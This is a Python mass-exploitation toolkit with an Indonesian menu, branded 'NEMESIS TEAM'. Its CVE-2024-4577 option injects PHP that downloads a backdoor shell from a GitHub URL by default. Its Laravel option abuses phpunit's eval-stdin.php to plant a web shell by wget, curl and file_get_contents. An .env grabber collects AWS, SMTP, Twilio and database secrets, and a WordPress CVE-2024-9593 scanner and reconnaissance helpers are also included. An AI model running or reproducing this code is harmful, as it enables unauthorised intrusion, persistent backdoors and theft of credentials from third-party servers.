import os
import sys
import time
import random
import asyncio
import aiohttp
import aiofiles
import warnings
import requests as r
import itertools
import threading
import re
from urllib.parse import urljoin
from re import findall as reg
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
from colorama import Fore, Style, init

warnings.filterwarnings("ignore", category=DeprecationWarning)
r.packages.urllib3.disable_warnings()
init(autoreset=True)

res = Style.RESET_ALL
gr = Fore.GREEN
red = Fore.RED
wh = Fore.WHITE
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bl = Fore.BLUE

# === TOOL 1: Exploit CVE-2024-4577 ===
def tool_exploit_cve_2024_4577():
    targets_file = input(f"{gr}[•] Masukkan file list target: {wh}")
    code = input(f"{gr}[•] Masukkan perintah PHP (default auto download shell): {wh}").strip()
    threads = int(input(f"{gr}[•] Jumlah thread (default 50): {wh}") or 50)

    if not code:
        code = "curl -o s3rvice.php https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/refs/heads/main/alfa/bepaslah.php"

    try:
        with open(targets_file, 'r') as f:
            targets = [line.strip().rstrip('/') for line in f if line.strip()]
    except:
        print(f"{red}[X] Gagal membaca file.{res}")
        return

    user_agents = [
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
    ]

    os.makedirs("Results", exist_ok=True)
    lock = threading.Lock()
    
    with open('Results/CVE-2024-4577.txt', 'w') as sukses_file, \
         open('Results/CVE-2024-4577_gagal.txt', 'w') as gagal_file:

        def exploit(target):
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"
                }
                s = r.Session()
                s.verify = False
                s.headers.update(headers)

                url = f"{target}?%ADd+allow_url_include=1+-d+auto_prepend_file=php://input"
                payload = f"<?php system('{code}'); ?>"
                res = s.post(url, data=payload, timeout=15)

                shell_url = urljoin(target + '/', 's3rvice.php')
                cek = s.get(shell_url, timeout=15)

                if "<title>NEMESIS</title>" in cek.text:
                    print(f"{gr}[+] SUCCESS: {shell_url}{res}")
                    with lock:
                        sukses_file.write(f"{shell_url}\n")
                else:
                    print(f"{red}[-] GAGAL: {target}{res}")
                    with lock:
                        gagal_file.write(f"{target}\n")
            except Exception as e:
                print(f"{yl}[!] ERROR: {target} -> {str(e)}{res}")
                with lock:
                    gagal_file.write(f"{target}\n")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(exploit, targets)

    print(f"\n{gr}[✓] Proses selesai. Cek folder Results.{res}")

# === TOOL 2: Laravel .env Grabber ===
def tool_env_grabber():
    os.makedirs("Results", exist_ok=True)
    try:
        with open(input(f"{gr}[•] Masukkan file list target: {wh}"), 'r') as f:
            sites = f.readlines()
    except:
        print(f"{red}[X] Gagal membaca file.{res}")
        return

    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

    def grabb(url):
        if "://" not in url:
            url = "http://" + url.strip()
        else:
            url = url.strip()

        try:
            resp = r.get(url + "/.env", headers=headers, timeout=5, verify=False).text
            if 'DB_HOST' in resp:
                if "AWS_ACCESS_KEY_ID" in resp or "AWS_KEY" in resp or "SES_KEY" in resp:
                    with open("Results/Valid_Aws_Secret_Keys.txt", "a") as f:
                        f.write(url + "\n")
                if "MAIL_HOST" in resp:
                    with open("Results/Valid_SMTPs.txt", "a") as f:
                        f.write(url + "\n")
                if "NEXMO" in resp:
                    with open("Results/Valid_Nexmo.txt", "a") as f:
                        f.write(url + "\n")
                if "TWILIO" in resp:
                    with open("Results/Valid_Twilio.txt", "a") as f:
                        f.write(url + "\n")
                if 'DB_HOST=mysql.' in resp:
                    with open("Results/!Valid_Mysql.txt", "a") as f:
                        f.write(url + "\n")
                print(f"{gr}[VALID]{res} {url}")
            else:
                print(f"{red}[INVALID]{res} {url} (bukan Laravel .env)")
        except Exception as e:
            print(f"{yl}[TIMEOUT]{res} {url} -> {str(e)}")

    ThreadPool(50).map(grabb, sites)
    print(f"\n{gr}[✓] Selesai - Cek folder Results.{res}")

# === TOOL 3: CVE-2024-9593 WordPress Scanner ===
def tool_cve_2024_9593():
    async def get_url(url):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = {'function': 'phpinfo'}

        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(url, data=data, headers=headers, timeout=6, ssl=False) as resp:
                    response = await resp.text()
                    if resp.status == 200 and 'etc' in response:
                        print(f'{red}[+] VULN FOUND ---> {url}{res}')
                        async with aiofiles.open('Results/CVE-2024-9593.txt', 'a') as f:
                            await f.write(url + '\n')
                    else:
                        print(f'[-] Not found {url}')
            except Exception as e:
                print(f"{yl}[!] ERROR {url} -> {e}{res}")

    async def main_async():
        input_file = input(f"{gr}[•] Masukkan file list URL (tanpa /wp-admin): {wh}")
        try:
            async with aiofiles.open(input_file, 'r') as f:
                urls = [f"{line.strip()}/wp-admin/admin-ajax.php?action=etimeclockwp_load_function" async for line in f]
        except:
            print(f"{red}[X] Gagal membaca file.{res}")
            return

        await asyncio.gather(*(get_url(u) for u in urls))

    print(f"{cy}[i] Scanning async dimulai...{res}")
    start_time = time.time()
    asyncio.run(main_async())
    end_time = time.time()
    print(f"\n{gr}[✓] Selesai dalam {end_time - start_time:.2f} detik. Cek Results/CVE-2024-9593.txt{res}")

# === TOOL 4: Admin Page Finder ===
def tool_admin_finder():
    def check_admin(url):
        try:
            admin_pages = [
                'admin', 'login', 'wp-admin', 'admin.php',
                'administrator', 'backend', 'panel', 'cms'
            ]
            for page in admin_pages:
                target = f"{url}/{page}"
                resp = r.get(target, timeout=7, verify=False)
                if resp.status_code == 200:
                    print(f"{gr}[+] Found: {target}{res}")
                    with open("Results/Found_Admins.txt", "a") as f:
                        f.write(target + "\n")
                    return
            print(f"{red}[-] Not found: {url}{res}")
        except:
            print(f"{yl}[!] Error: {url}{res}")

    try:
        with open(input(f"{gr}[•] Masukkan file list target: {wh}"), 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except:
        print(f"{red}[X] Gagal membaca file.{res}")
        return

    print(f"{cy}[*] Memulai pencarian halaman admin...{res}")
    ThreadPool(30).map(check_admin, targets)
    print(f"\n{gr}[✓] Selesai! Cek Results/Found_Admins.txt{res}")

# === TOOL 5: Subdomain Scanner ===
def tool_subdomain_scanner():
    def scan_subdomain(domain):
        try:
            subdomains = [
                'www', 'mail', 'ftp', 'webmail', 'cpanel', 
                'admin', 'blog', 'dev', 'test', 'api'
            ]
            for sub in subdomains:
                target = f"http://{sub}.{domain}"
                try:
                    resp = r.get(target, timeout=5, verify=False)
                    if resp.status_code == 200:
                        print(f"{gr}[+] Found: {target}{res}")
                        with open("Results/Found_Subdomains.txt", "a") as f:
                            f.write(target + "\n")
                except:
                    continue
            print(f"{cy}[*] Selesai: {domain}{res}")
        except Exception as e:
            print(f"{yl}[!] Error: {domain} -> {str(e)}{res}")

    try:
        with open(input(f"{gr}[•] Masukkan file list domain: {wh}"), 'r') as f:
            domains = [line.strip() for line in f if line.strip()]
    except:
        print(f"{red}[X] Gagal membaca file.{res}")
        return

    print(f"{cy}[*] Memulai scanning subdomain...{res}")
    ThreadPool(20).map(scan_subdomain, domains)
    print(f"\n{gr}[✓] Selesai! Cek Results/Found_Subdomains.txt{res}")

# === TOOL 6: Log Splitter ===
def tool_log_splitter():
    # Fungsi Animasi Loading
    def loading_animation(stop_event):
        animation = itertools.cycle(["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"])
        while not stop_event.is_set():
            sys.stdout.write(f"\r{cy}🔍 Scanning {next(animation)} {res}")
            sys.stdout.flush()
            time.sleep(0.1)

    print(f"\n{gr}[•] Tool Log Splitter - Pisahkan URL berdasarkan kata kunci{res}")
    
    log_file = input(f"{gr}[•] Masukkan nama file logs.txt: {wh}").strip()
    keywords_input = input(f"{gr}[•] Masukkan kata kunci (pisahkan dengan koma): {wh}")
    keywords = [keyword.strip() for keyword in keywords_input.split(",")]

    # Cek apakah file ada
    if not os.path.isfile(log_file):
        print(f"\n{red}[X] File {log_file} tidak ditemukan!{res}")
        return

    # Baca isi file
    try:
        with open(log_file, "r", encoding="utf-8", errors="ignore") as file:
            urls = file.readlines()
    except Exception as e:
        print(f"{red}[X] Gagal membaca file: {str(e)}{res}")
        return

    os.makedirs("Results/Logs", exist_ok=True)
    
    # Mulai Animasi Loading
    stop_event = threading.Event()
    loading_thread = threading.Thread(target=loading_animation, args=(stop_event,))
    loading_thread.start()

    time.sleep(1)  # Simulasi delay biar animasi terlihat
    
    results = []
    for keyword in keywords:
        output_file = f"Results/Logs/{keyword}.txt"
        matched_urls = [url for url in urls if keyword.lower() in url.lower()]

        if matched_urls:
            with open(output_file, "w") as out:
                out.writelines(matched_urls)
            results.append(f"{gr}[✔] {wh}{output_file} ({len(matched_urls)} URL)")
        else:
            results.append(f"{yl}[!] {wh}{keyword} (0 URL)")

    # Stop Animasi Loading
    stop_event.set()
    loading_thread.join()

    # Tampilkan hasil
    print("\n" + "-"*50)
    print(f"{cy}📊 HASIL PEMISAHAN LOG:{res}")
    for result in results:
        print(result)
    print(f"\n{gr}[✓] Proses selesai! File disimpan di folder Results/Logs{res}")

# === TOOL 7: Laravel Auto Shell Uploader (NEMESIS) ===
def tool_laravel_auto_shell():
    print(f"""{red}
    ╔═╗┌─┐┌┬┐┌─┐┬─┐┌┬┐┌─┐┬─┐  ╔═╗┌─┐┌─┐┌─┐┌─┐┌─┐┬─┐
    ║  │ │ │ │ │├┬┘ │ │ │├┬┘  ╚═╗│  ├─┤└─┐└─┐├┤ ├┬┘
    ╚═╝└─┘ ┴ └─┘┴└─ ┴ └─┘┴└─  ╚═╝└─┘┴ ┴└─┘└─┘└─┘┴└─
    {yl}Laravel Auto Shell Uploader {gr}NEMESIS{res}
    """)
    
    targets_file = input(f"{gr}[•] Masukkan file list target: {wh}")
    threads = int(input(f"{gr}[•] Jumlah thread (default 20): {wh}") or 20)
    
    try:
        with open(targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except:
        print(f"{red}[X] Gagal membaca file.{res}")
        return

    os.makedirs("Results/Laravel", exist_ok=True)
    lock = threading.Lock()
    
    def LxPlOiT1(url):
        try:
            checkvuln = '<?php echo php_uname("a"); ?>'
            shelluploader = '<?php system("wget https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php -O mk.php"); ?>'
            exploit_url = f"{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            
            resp = r.post(exploit_url, data=checkvuln, timeout=10, verify=False)
            if 'Linux' in resp.text:
                print(f"{yl}[+] VULN: {url}{res}")
                with lock:
                    with open('Results/Laravel/LaravelPatch.txt', 'a') as f:
                        f.write(f"{resp.text}\n{exploit_url}\n")
                
                r.post(exploit_url, data=shelluploader, timeout=10, verify=False)
                shell_url = f"{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php"
                check_shell = r.get(shell_url, timeout=10, verify=False)
                
                if 'NEMESIS_HaxOR' in check_shell.text:
                    print(f"{gr}[+] SHELL UPLOADED: {shell_url}{res}")
                    with lock:
                        with open('Results/Laravel/Shell_Laravel.txt', 'a') as f:
                            f.write(f"{resp.text}\n{shell_url}\n")
                        with open('Results/Laravel/Good.txt', 'a') as f:
                            f.write(f"{shell_url}\n")
                else:
                    print(f"{red}[-] FAILED: {url}{res}")
            else:
                print(f"{red}[-] NOT VULN: {url}{res}")
        except Exception as e:
            print(f"{yl}[!] ERROR: {url} -> {str(e)}{res}")

    def LxPlOiT2(url):
        try:
            checkvuln = '<?php echo php_uname("a"); ?>'
            shelluploader = '<?php fwrite(fopen("mk.php","w+"),file_get_contents("https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php")); ?>'
            exploit_url = f"{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            
            resp = r.post(exploit_url, data=checkvuln, timeout=10, verify=False)
            if 'Linux' in resp.text:
                print(f"{yl}[+] VULN: {url}{res}")
                with lock:
                    with open('Results/Laravel/LaravelPatch.txt', 'a') as f:
                        f.write(f"{resp.text}\n{exploit_url}\n")
                
                r.post(exploit_url, data=shelluploader, timeout=10, verify=False)
                shell_url = f"{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php"
                check_shell = r.get(shell_url, timeout=10, verify=False)
                
                if 'NEMESIS_HaxOR' in check_shell.text:
                    print(f"{gr}[+] SHELL UPLOADED: {shell_url}{res}")
                    with lock:
                        with open('Results/Laravel/Shell_Laravel.txt', 'a') as f:
                            f.write(f"{resp.text}\n{shell_url}\n")
                        with open('Results/Laravel/Good.txt', 'a') as f:
                            f.write(f"{shell_url}\n")
                else:
                    print(f"{red}[-] FAILED: {url}{res}")
            else:
                print(f"{red}[-] NOT VULN: {url}{res}")
        except Exception as e:
            print(f"{yl}[!] ERROR: {url} -> {str(e)}{res}")

    def LxPlOiT3(url):
        try:
            checkvuln = '<?php echo php_uname("a"); ?>'
            upshell = '<?php system("curl -O https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php); system("mv up.php mk.php"); ?>'
            exploit_url = f"{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            
            resp = r.post(exploit_url, data=checkvuln, timeout=10, verify=False)
            if 'Linux' in resp.text:
                print(f"{yl}[+] VULN: {url}{res}")
                with lock:
                    with open('Results/Laravel/LaravelPatch.txt', 'a') as f:
                        f.write(f"{resp.text}\n{exploit_url}\n")
                
                r.post(exploit_url, data=upshell, timeout=10, verify=False)
                shell_url = f"{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php"
                check_shell = r.get(shell_url, timeout=10, verify=False)
                
                if 'NEMESIS_HaxOR' in check_shell.text:
                    print(f"{gr}[+] SHELL UPLOADED: {shell_url}{res}")
                    with lock:
                        with open('Results/Laravel/Shell_Laravel.txt', 'a') as f:
                            f.write(f"{resp.text}\n{shell_url}\n")
                        with open('Results/Laravel/Good.txt', 'a') as f:
                            f.write(f"{shell_url}\n")
                else:
                    print(f"{red}[-] FAILED: {url}{res}")
            else:
                print(f"{red}[-] NOT VULN: {url}{res}")
        except Exception as e:
            print(f"{yl}[!] ERROR: {url} -> {str(e)}{res}")

    def process_url(url):
        try:
            LxPlOiT1(url)
            LxPlOiT2(url)
            LxPlOiT3(url)
        except Exception as e:
            print(f"{yl}[!] CRITICAL ERROR: {url} -> {str(e)}{res}")

    print(f"{cy}[*] Memulai eksploitasi dengan {threads} thread...{res}")
    start_time = time.time()
    
    with Pool(threads) as pool:
        pool.map(process_url, targets)
    
    end_time = time.time()
    print(f"\n{gr}[✓] Proses selesai dalam {end_time - start_time:.2f} detik")
    print(f"{gr}[✓] Hasil disimpan di folder Results/Laravel{res}")

# === MENU UTAMA ===
def menu():
    while True:
        print(f"""\n{mg}=== MENU TOOLS ===
{gr}1{res}. Exploit CVE-2024-4577 (Mass Include)
{gr}2{res}. Grabber Laravel .env (AWS, SMTP, dll)
{gr}3{res}. Scanner CVE-2024-9593 (WP etimeclockwp)
{gr}4{res}. Admin Page Finder
{gr}5{res}. Subdomain Scanner
{gr}6{res}. Log Splitter (Pisahkan URL)
{gr}7{res}. Laravel Auto Shell Uploader (NEMESIS)
{gr}0{res}. Keluar""")
        pilih = input(f"{bl}>>> Pilih tools (0-7): {wh}")

        if pilih == "1":
            tool_exploit_cve_2024_4577()
        elif pilih == "2":
            tool_env_grabber()
        elif pilih == "3":
            tool_cve_2024_9593()
        elif pilih == "4":
            tool_admin_finder()
        elif pilih == "5":
            tool_subdomain_scanner()
        elif pilih == "6":
            tool_log_splitter()
        elif pilih == "7":
            tool_laravel_auto_shell()
        elif pilih == "0":
            print(f"{gr}[✓] Keluar dari program.{res}")
            break
        else:
            print(f"{red}[X] Pilihan tidak valid!{res}")

if __name__ == "__main__":
    os.makedirs("Results", exist_ok=True)
    banner = f"""{cy}
    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
    {gr}Multi-Tool Pentesting {wh}v4.0 {cy}| by NEMESIS TEAM{res}
    """
    print(banner)
    menu()
